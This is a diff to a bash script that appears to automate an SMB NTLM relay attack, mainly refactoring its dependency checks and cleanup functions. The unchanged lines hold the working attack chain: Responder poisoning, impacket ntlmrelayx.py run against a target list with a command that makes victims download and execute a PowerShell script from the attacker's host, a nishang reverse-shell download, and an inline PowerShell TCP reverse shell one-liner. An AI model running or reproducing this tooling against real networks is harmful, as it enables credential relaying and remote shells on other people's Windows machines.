@@ -25,22 +25,8 @@ grayColour="\e[0;37m\033[1m"
 
 trap ctrl_c INT
 
-function badExit(){
-	tmux kill-session -t 'smbautorelay*' &>/dev/null
-	if [ -e "$(pwd)/shell.ps1" ];then
-		rm -f $(pwd)/shell.ps1 &>/dev/null
-	fi
-	tput cnorm; exit 1
-}
+function cleaning(){
 
-function goodExit(){
-	tput cnorm; exit 0
-}
-
-function ctrl_c(){
-
-	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting...";
-	
 	tmux kill-session -t 'smbautorelay*' &>/dev/null
 	if [ -e "$(pwd)/shell.ps1" ];then
 		rm -f $(pwd)/shell.ps1 &>/dev/null
@@ -51,7 +37,28 @@ function ctrl_c(){
 		wait $terminal_nc_PID &>/dev/null
     	fi
 	
-	badExit
+	tput cnorm; exit 1
+	
+}
+
+function badExit(){
+	
+	cleaning
+	tput cnorm; exit 1
+	
+}
+
+function goodExit(){
+
+	tput cnorm; exit 0
+	
+}
+
+function ctrl_c(){
+
+	echo -e "\n${redColour}[D:]${endColour} Keyboard interruption detected! Exiting...";
+	
+	cleaning
 	
 }
 
@@ -162,12 +169,27 @@ function checkProgramsNeeded(){
 
 }
 
+function checkDependency(){
+
+	if [ "$1" == "ntlmrelayx.py" ];then
+		test -f "$(pwd)/impacket/$1" &>/dev/null
+	elif [ "$1" == "responder" ];then
+		test -f "$(pwd)/responder/$1" &>/dev/null
+	elif [ "$1" == "net-tools" ];then
+		which ifconfig &>/dev/null
+	else
+		which $1 &>/dev/null
+	fi
+	
+	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} $1 not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+
+}
+
 function checkTargets(){
 	
-    test -f $(pwd)/impacket/ntlmrelayx.py &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+	checkDependency "ntlmrelayx.py"
 	
-    if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking targets...\n"; sleep 0.5; fi
+	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking targets...\n"; sleep 0.5; fi
 	
 	if [ -e $(pwd)/impacket/targets.txt ];then rm -f $(pwd)/impacket/targets.txt &>/dev/null; fi
 
@@ -189,8 +211,7 @@ function checkTargets(){
 
 function checkResponderConfig(){
 
-    test -f $(pwd)/responder/Responder.py &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} responder not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+    	checkDependency "responder"
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking responder config..."; fi
 
@@ -227,13 +248,12 @@ function checkResponderConfig(){
 
 function bTmux(){
 	tmux kill-session -t "smbautorelay*" &>/dev/null
-	echo -e "${redColour}[D:]${endColour} Tmux blew up... That hurts! >.< . Try running me again\n"; badExit
+	echo -e "${redColour}[D:]${endColour} Tmux blew up... That hurts!. Try running me again\n"; badExit
 }
 
 function relayingAttack(){
 
-   	which tmux &>/dev/null
-   	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} tmux not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+   	checkDependency "tmux"
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Starting Tmux server...\n"; sleep 0.5; fi
 	tmux start-server &>/dev/null
@@ -254,13 +274,10 @@ function relayingAttack(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Tmux setted up. Launching responder...\n"; sleep 0.5; fi
 
-    test -f $(pwd)/responder/Responder.py &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redcolour}[d:]${endcolour} responder not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 	tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m &>/dev/null && tmux swap-pane -d &>/dev/null 
 	if [ $? -ne 0 ];then bTmux; else sleep 1; fi
 
-    which ifconfig &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} net-tools not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+    	checkDependency "net-tools"
 
 	lhost=$(ifconfig $interface | grep "inet\s" | awk '{print $2}')
 	openPorts=($(netstat -tunalp | grep -v 'Active\|Proto' | grep 'tcp' | awk '{print $4}' | awk -F: '{print $NF}' | sort -u | xargs))
@@ -270,8 +287,9 @@ function relayingAttack(){
 
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 0.5; fi
 
+	checkDependency "wget"
+
 	wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O $(pwd)/shell.ps1 &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} wget not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 	if [ ! -e "$(pwd)/shell.ps1" ];then
 		if [ ! -z $quiet ];then echo -e "${yellowColour}[:S]${endColour} Unable to get nishang payload. Let's try crafting it manually...\n"; sleep 0.5; fi
 		rshell='$client = New-Object System.Net.Sockets.TCPClient("'$lhost'",'$lport');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
@@ -285,9 +303,6 @@ function relayingAttack(){
 	if [ $? -ne 0 ];then bTmux; else sleep 0.5; fi
 	
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
-	
-	test -f $(pwd)/impacket/ntlmrelayx.py &>/dev/null
-    	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 	
     	command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
 	let paneID+=1; tmux select-pane -t $paneID &>/dev/null && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m &>/dev/null
@@ -309,19 +324,11 @@ function relayingAttack(){
 		termite -hold -e "$command" &>/dev/null &
 		terminal_nc_PID=!$
 	else
-        which xterm &>/dev/null
-        if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} xterm not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
-
-        which rlwrap &>/dev/null
-        if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} rlwrap not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
-
-        xterm -hold -T 'XTerm' -e "$command" &>/dev/null &
+        	checkDependency "xterm"; checkDependency "rlwrap"
+	        xterm -hold -T 'XTerm' -e "$command" &>/dev/null &
 		terminal_nc_PID=!$
 	fi
-
-	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; fi
-
-    sleep 0.5
+	if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Unable to locate terminal in the system. Existing...\n"; badExit; else sleep 0.5; fi
 
 	portStatus=$(netstat -tunalp | grep $lport | awk '{print $6}' | sort -u)
 	while [ "$portStatus" == "LISTEN" ];do
@@ -371,7 +378,7 @@ function rmsw(){
 				fi
 				
 				if [ $? -ne 0 ];then
-					if [ ! -z $quiet ];then echo -e "\t${redColour}[D:]${endColour} Unable to uninstall $line. Try manually\n"; sleep 0.5; fi
+					if [ ! -z $quiet ];then echo -e "\t${redColour}[D:]${endColour} Unable to uninstall $line. Try to do it manually\n"; sleep 0.5; fi
 				else
 					if [ ! -z $quiet ];then echo -e "\t${greenColour}[:)]${endColour} $line uninstaled\n"; sleep 0.5; fi
 				fi
@@ -398,7 +405,7 @@ if [ "$(id -u)" == 0 ]; then
 	tput civis
 	quiet='1'
 	remove=''
-    discard=0
+    	discard=0
 	declare -i parameter_counter=0;
 	
 	while getopts "qri:t:hd" arg; do
@@ -408,7 +415,7 @@ if [ "$(id -u)" == 0 ]; then
 			i) interface=$OPTARG; let parameter_counter+=1 ;;
 			t) targets=$OPTARG; let parameter_counter+=1 ;;
 			h) helpMenu;;
-            d) discard=1;;
+            		d) discard=1;;
 		esac
 	done
 
@@ -441,4 +448,4 @@ if [ "$(id -u)" == 0 ]; then
 	
 	goodExit
 
-else echo -e "\n${redColour}[:!] Super powers not activated!${endColour}\n${blueColour}[:*] You need root privileges to run this tool!${endColour}"; badExit; fi
+else echo -e "\n${redColour}[D:]${endColour} Super powers not activated!\n${blueColour}[:*]${endColour} You need root privileges to run this tool!"; badExit; fi
